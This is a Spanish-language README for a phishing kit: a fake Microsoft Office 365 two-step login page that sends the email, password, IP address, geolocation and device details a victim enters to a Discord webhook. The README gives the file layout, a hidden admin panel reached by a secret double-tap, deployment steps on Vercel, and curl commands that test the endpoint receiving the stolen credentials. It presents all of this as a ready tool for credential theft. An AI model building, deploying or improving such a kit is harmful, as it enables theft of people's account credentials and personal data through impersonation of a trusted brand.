# Mail Office 365 - Panel de Login

Panel de inicio de sesión estilo Microsoft Office 365 con envío de datos a Discord.

## Estructura del proyecto

```
mail-office365/
├── index.html          → Login paso 1 (email)
├── password.html       → Login paso 2 (contraseña)
├── dashboard.html      → Página principal tras el login
├── admin.html          → Panel de administración (oculto)
├── api/
│   ├── config.js       → API: GET/PUT/PATCH configuración global
│   └── discord.js      → API: POST datos al webhook de Discord
├── package.json
├── vercel.json
├── favicon.svg
└── init.js             → Script de ayuda para configuración inicial
```

## Flujo de uso

1. **index.html** → Ingresa email → "Siguiente"
2. **password.html** → Ingresa contraseña → "Iniciar sesión"
   - Se envían los datos a Discord automáticamente
   - Se redirige al dashboard
3. **dashboard.html** → Página principal del usuario

## Panel de administración

Acceso secreto: **Doble tap en "Ayuda" + "Privacidad y cookies"** (pies de página).

Desde el admin puedes editar:
- Logo y textos del login
- Fondo (color, degradado o imagen)
- Webhook de Discord
- Plantilla del mensaje
- Título y subtítulo del dashboard

Los cambios se guardan en GitHub y son **globales** para todos los usuarios.

## Variables de entorno (Vercel)

Configura estas variables en tu proyecto Vercel:

| Variable | Valor |
|----------|-------|
| `GH_TOKEN` | Token de acceso personal de GitHub |
| `GH_OWNER` | `varasjaime777-alt` (o tu username) |
| `GH_REPO` | `mail-office365` |

## Configuración inicial

1. Crea un repo en GitHub: `varasjaime777-alt/mail-office365`
2. Sube este proyecto al repo
3. En el repo, crea `config.json` con:
   ```json
   {
     "discordWebhook": "https://discord.com/api/webhooks/ID/TOKEN"
   }
   ```
4. Configura las env vars en Vercel
5. Deploy: `vercel --prod --force`

## Deploy

```bash
cd /c/Users/varas/mail-office365
vercel --prod --force
```

## Verificar API

```bash
# Config
curl -s https://mail-office365.vercel.app/api/config

# Discord (prueba)
curl -s -X POST https://mail-office365.vercel.app/api/discord \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"***","userAgent":"test",...}'
```

## Características técnicas

- **Login 2 pasos**: Email primero, contraseña después (sin mostrar email en paso 2)
- **Discord webhook**: Envía email, contraseña, IP, geo IP, dispositivo, batería, navegador
- **Fondo editables**: Color, degradado o imagen URL
- **Footer**: Ayuda, Términos de uso, Privacidad y cookies (en todas las páginas)
- **Persistencia global**: GitHub API (100% gratis)
- **Acceso admin**: Doble-tap secreto en footer

## APIs de Geo IP usadas

1. **ipinfo.io/json** → ciudad, país, región, ISP, lat/lon
2. **api.ipify.org** → IP pública

## Licencia

Uso libre.
